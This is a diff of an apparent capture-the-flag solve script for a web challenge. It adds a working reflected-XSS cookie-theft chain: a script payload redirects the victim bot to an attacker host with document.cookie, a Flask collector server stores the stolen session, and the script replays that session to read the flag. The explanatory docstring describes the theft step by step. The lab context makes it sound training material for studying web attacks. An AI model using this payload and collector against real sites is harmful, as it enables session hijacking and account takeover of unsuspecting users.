@@ -1,12 +1,26 @@
 import os
 import re
 import requests
+import signal
+from flask import Flask, request, session
 
 
 """
+Theory:
+	We need to send the session cookie cross site to our own server.
+	We then can retrieve the cookie info from our server and use it in another request
+	to the info endpoint of the challenge.
+	To allow the session to be sent cross site, the respective request to our server must
+	be triggered via a navigational event. We therefore use href. The browser then allows us
+	to send the document.cookie with the request. This works, since during the initial cookie
+	generation the cookie http_only property was set to false. Otherwise we would not be able
+	to access the cookie via javascript.
+
+    app.config['SESSION_COOKIE_HTTPONLY'] = False
+
     db.execute(("CREATE TABLE IF NOT EXISTS users AS "
-                'SELECT "flag" AS username, ? as password, ? as leak'),
-               (flag, False))
+                'SELECT "flag" AS username, ? as password'),
+               (flag,))
 
     if request.path == "/login":
         if request.method == "POST":
@@ -23,21 +37,17 @@ import requests
 
         return form(["username", "password"])
 
-    if request.path == "/leak":
-        user_id = int(session.get("user", -1))
-        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
-        assert user, "Not logged in"
-        db.execute(f"UPDATE users SET leak = TRUE WHERE rowid = ?", (user_id,))
-        return "Leaked\n"
-
     if request.path == "/info":
-        assert "user" in request.args, "Missing `user` argument"
-        user_id = int(request.args["user"])
-        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
-        assert user, "Invalid `user`"
-        info = [user["username"]]
-        if user["leak"]:
-            info.append(user["password"])
+        session_user_id = int(session.get("user", -1))
+        session_user = db.execute("SELECT * FROM users WHERE rowid = ?", (session_user_id,)).fetchone()
+
+        request_user_id = int(request.args.get("user", session_user_id))
+        request_user = db.execute("SELECT * FROM users WHERE rowid = ?", (request_user_id,)).fetchone()
+        assert request_user, "Invalid `user`"
+
+        info = [request_user["username"]]
+        if request_user_id == session_user_id:
+            info.append(request_user["password"])
         return " ".join(info) + "\n"
 
     if request.path == "/visit":
@@ -95,21 +105,52 @@ if pid == 0:
 	print("Error execv.")
 	exit(1)
 
+pid = os.fork()
+
+if pid == -1:
+	print("Error fork.")
+	exit(1)
+
+if pid == 0:
+	os.close(r_pipe1)
+	os.close(w_pipe1)
+
+	app = Flask(__name__)
+
+	args = [] # we use a list to ensure, the variable values are persisted accross requests
+
+	@app.route("/", methods=["GET", "POST"])
+	def store_ses():
+		print(request.args.get("session"))
+		args.append(request.args.get("session"))
+		return f"{args}", 200
+
+	@app.route("/ret", methods=["GET", "POST"])
+	def ret_ses():
+		print(args)
+		return f"{args}"
+
+	app.run("hacker.localhost", 30080, debug=False)
+
 os.close(w_pipe1)
 
-output = os.fdopen(r_pipe1, "r")
+output = os.fdopen(r_pipe1)
 
 while True:
 	line = output.readline()
 	print(line, end="")
+
 	m = pat0.match(line)
 	if m:
 		url = "http://challenge.localhost:80/visit"
-		data = {"url": 'http://challenge.localhost:80/echo?echo=<script>var xhr = new XMLHttpRequest();xhr.open("GET", "http://challenge.localhost:80/leak", false);xhr.withCredentials = true;xhr.setRequestHeader("Cookie", document.cookie);xhr.send();</script>'}
+		xss = '<script>window.location.href="http://hacker.localhost:30080/?"%2bdocument.cookie</script>' # we url encode plus, since auto url encode only on top level not for nested url
+		data = {"url": f'http://challenge.localhost:80/echo?echo={xss}'}
 		r = requests.get(url, params=data)
-		print(r.text)
+		url = "http://hacker.localhost:30080/ret"
+		r = requests.get(url)
 		url = "http://challenge.localhost:80/info"
-		data = {"user": "1"}
-		r = requests.get(url, params=data)
+		cookie={"session": r.text.replace("'", "").replace("[", "").replace("]", "")}
+		print(f"cookie={cookie}")
+		r = requests.get(url, cookies=cookie)
 		print(r.text)
-		break
+		os.kill(pid, signal.SIGKILL)
